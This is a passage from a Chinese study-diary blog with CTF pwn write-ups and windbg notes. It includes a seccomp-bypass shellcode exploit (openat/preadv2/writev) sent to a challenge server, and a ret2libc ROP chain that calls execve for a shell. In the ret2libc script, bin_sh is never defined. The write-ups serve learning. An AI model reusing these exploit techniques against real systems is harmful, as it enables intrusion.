punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">17LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">295LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">40LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">seccomp_load</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> v2 <span class="token operator">-</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>示例如下，即<code>preadv2</code>的二参是一个结构体，且这个结构体包含了数据缓冲区地址以及长度，就相当于原来<code>read</code>的二参和三参</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/syscall.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/uio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SYS_preadv2</span> <span class="token expression"><span class="token number">327</span></span></span><span class="token class-name">ssize_t</span> <span class="token function">preadv2</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">iovec</span> <span class="token operator">*</span>iov<span class="token punctuation">,</span> <span class="token keyword">int</span> iovcnt<span class="token punctuation">,</span> <span class="token class-name">off_t</span> offset<span class="token punctuation">,</span> <span class="token keyword">int</span> flags<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">syscall</span><span class="token punctuation">(</span>SYS_preadv2<span class="token punctuation">,</span> fd<span class="token punctuation">,</span> iov<span class="token punctuation">,</span> iovcnt<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> flags<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 打开文件</span>    <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"open"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 准备读取数据的缓冲区</span>    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">0x50</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token comment">// 设置读取操作的 iovec 结构体</span>    <span class="token keyword">struct</span> <span class="token class-name">iovec</span> iov<span class="token punctuation">;</span>    iov<span class="token punctuation">.</span>iov_base <span class="token operator">=</span> buffer<span class="token punctuation">;</span>    iov<span class="token punctuation">.</span>iov_len <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 使用 preadv2 读取文件数据到缓冲区</span>    <span class="token class-name">ssize_t</span> bytes_read <span class="token operator">=</span> <span class="token function">preadv2</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>iov<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>bytes_read <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"preadv2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 输出读取的数据</span>    <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> bytes_read<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 关闭文件</span>    <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终<code>exp</code>如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'8.147.128.163'</span><span class="token punctuation">,</span> <span class="token number">36703</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'\x00PP'</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''/* openat(fd=-0x64, file='flag', oflag=0) */        add rax, 0x62        mov r12, rax        mov rsi, rax        mov rdi, -0x64        /* call openat() */        mov rax, 0x101 /* 0x101 */        syscall        /* preadv2(vararg_0=3, vararg_1=0x1337090, vararg_2=1, vararg_3=0, vararg_4=0) */        mov rdi, 3        mov rdx, 0x1        add r12, 0x15        mov rsi, r12        /* call preadv2() */        mov rax, 327        syscall        /* writev(fd=1, iovec=0x1337090, count=1) */        mov rdi, 1        mov rdx, 0x1        /* call writev() */        mov rax, 0x14        syscall'''</span><span class="token punctuation">)</span>p <span class="token operator">+=</span> shellcode <span class="token operator">+</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">0x10</span> <span class="token operator">+</span> <span class="token string">b'flag\x00'</span> <span class="token operator">+</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">0x10</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x1337090</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'entrance'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="7-6"><a href="#7-6" class="headerlink" title="#7.6"></a>#7.6</h2><p>今天坐大牢，一个知识点没查到肝了半天，下午又被摇过去改申请书嘻嘻，晚上试图逆向分析复现一下比赛，<code>but</code>卡住了工具上，用<code>IDA</code>直接崩，<code>x64dbg</code>调到<code>crash</code>的位置了又换<code>windbg</code>，卡在软件下载和使用上了…都是代理惹的祸~</p><h3 id="stdout"><a href="#stdout" class="headerlink" title="stdout"></a>stdout</h3><p>先检查保护</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">Arch:     amd64-64-little   RELRO:    Partial RELRO   Stack:    No canary found   NX:       NX enabled   PIE:      No PIE (0x3ff000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>main</code>函数里存在栈溢出，溢出长度刚好是一个地址</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">80</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-50h] BYREF</span>  <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"where is my stdout???"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x60uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重点是<code>init</code>函数，输出被设置为全缓冲区，只有当缓冲区被填满时才会进行I&#x2F;O操作</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也可以通过以下方式进行手动刷新缓冲区从而输出缓冲区中的内容：</p><ul><li>显式调用<code>fflush</code>函数</li><li>流被关闭（调用<code>fclose</code>）</li><li>程序正常结束（调用<code>exit</code>）</li></ul><p>程序其他部分包括<code>vuln extend</code>，<code>vuln</code>目的是进行更大长度的栈溢出，而<code>extend</code>是为了向输出缓冲区填入更多内容加快填满输出缓冲区，因为直接通过输出一个地址来填满输出缓冲区会由于连接不稳定而无法打通远程</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">ssize_t</span> <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-20h] BYREF</span>  <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x200uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">extend</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-30h] BYREF</span>  __int64 v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-28h]</span>  __int64 v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-20h]</span>  __int64 v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-18h]</span>  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-8h]</span>  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+2Ch] [rbp-4h]</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Just to increase the number of got tables"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>s <span class="token operator">=</span> <span class="token char">'!olleh'</span><span class="token punctuation">;</span>  v2 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v4 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v6 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strcmp</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">"hello!"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"hello!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">srand</span><span class="token punctuation">(</span><span class="token number">1u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v5 <span class="token operator">=</span> result<span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以本题的思路就是先利用<code>extend</code>填满输出缓冲区，再<code>ret2libc</code>，<code>exp</code>如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'39.106.48.123'</span><span class="token punctuation">,</span> <span class="token number">31448</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>vuln <span class="token operator">=</span> <span class="token number">0x40125D</span>ret <span class="token operator">=</span> <span class="token number">0x000000000040101a</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x58</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>vuln<span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x00000000004013d3</span>pop_rsi_r12_ret <span class="token operator">=</span> <span class="token number">0x00000000004013d1</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>extend <span class="token operator">=</span> <span class="token number">0x401287</span>p1 <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x28</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>extend<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">54</span> <span class="token operator">+</span> p1 <span class="token operator">+</span> p64<span class="token punctuation">(</span>vuln<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.31/libc-2.31.so'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x84420</span>pop_rdx_ret <span class="token operator">=</span> <span class="token number">0x0000000000142c92</span> <span class="token operator">+</span> libc_baseexecve <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'execve'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basep <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x28</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_r12_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>execve<span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="7-7"><a href="#7-7" class="headerlink" title="#7.7"></a>#7.7</h2><p>今天有点摆烂了…欸，周末嘛（bushi），主要是前一天睡的有点晚，直接润去姐姐家睡到了下午（）。晚上摸索了一下<code>windbg</code>基本用法</p><h3 id="windbg"><a href="#windbg" class="headerlink" title="windbg"></a>windbg</h3><p>打开文件：文件选项卡中打开exe文件</p><p>设置符号路径  ： <code>.sympath srv*</code></p><p>加载符号： <code>.reload</code></p><p>运行：<code>g</code></p><p>设置断点： <code>bp addr</code>  </p><p>查看堆栈状态：<code>kb</code></p><p>查看反汇编代码：<code>u addr</code></p><p>查看内容内容：双字：<code>dd/dc addr</code></p><p>​    Unicode 字符串 ：<code>du addr</code></p><p>​    十六进制双字：<code>dD addr</code></p><p>​    内存内容的指针：<code>dp addr</code></p><p>​    字：<code>dw addr</code></p><p>​    字节：<code>db addr</code></p><p>​    ASCII字符：<code>da addr</code></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">0:000> dc 0040000000400000  00405000 00406000 00407000 00408000  <span class="token punctuation">.</span>P<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>`<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>p<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>`<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>00400010  00409000 0040A000 0040B000 0040C000  <span class="token punctuation">.</span><span class="token punctuation">.</span>`<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>`<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>`<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>`<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>0:000> du 0040000000400000  <span class="token string">"Hello, world!"</span>00400010  <span class="token string">"This is a test string."</span>0:000> dd 0040000000400000  00405000 00406000 00407000 0040800000400010  00409000 0040A000 0040B000 0040C0000:000> db 0040000000400000  48 65 6C 6C 6F 2C 20 77-6F 72 6C 64 21 00 00 00  Hello<span class="token punctuation">,</span> world!<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>00400010  54 68 69 73 20 69 73 20-61 20 74 65 73 74 20 73  This is a test s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看寄存器：<code>r</code>&#x2F;   <code>r register</code></p><p>修改寄存器：<code>r register = value</code></p><p>单步执行：不进入函数：<code>p</code></p><p>​         进入函数：<code>t</code></p><h2 id="7-8"><a href="#7-8" class="headerlink" title="#7.8"></a>#7.8</h2><p>今天还在捣鼓<code>windbg</code>，有点难绷…</p><h3 id="windbg-1"><a href="#windbg-1" class="headerlink" title="windbg"></a>windbg</h3><p><code>windbg</code>作用和<code>pwndbg</code>类似，还需要结合<code>IDA</code>逆向分析</p><p>显示指定的加载模块:<code>lm</code></p><p>bp、bu 和 bm 命令设置新的断点，但它们具有不同的特征：</p><p>●bp (设置断点) 命令在命令中指定的断点位置的地址处设置新的断点。 如果在设置断点时调试器无法解析断点位置的地址表达式，则 bp 断点将自动转换为 bu 断点。 使用 bp 命令创建在卸载模块时不再处于活动状态的断点</p><p>●bu (设置未解析断点) 命令设置延迟或未解析的断点。 bu 断点是在对命令中指定的断点位置的符号引用上设置的， (不在地址) 上，每当解析具有引用的模块时，就会激活该断点。 有关这些断点的详细信息</p><p>●bm (设置符号断点) 命令在与指定模式匹配的符号上设置新的断点。 此命令可以创建多个断点。 默认情况下，匹配模式后， bm 断点与 bu 断点相同。 也就是说， bm 断点是在符号引用上设置的延迟断点。 但是，bm &#x2F;d 命令会创建一个或多个 bp 断点。 每个断点在匹配位置的地址上设置，不跟踪模块状态</p><p>●.bpcmds&#x2F;bl 查看断点情况</p><pre class="line-numbers language-none"><code class="language-none">0:000&gt; bm myprogram!mem*   4: 0040d070 MyProgram!memcpy  5: 0040c560 MyProgram!memmove  6: 00408960 MyProgram!memset0:000&gt; bp MyTest+0xb 7 #前六次忽略此断点，第七次传递时，执行会停止<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="7-9"><a href="#7-9" class="headerlink" 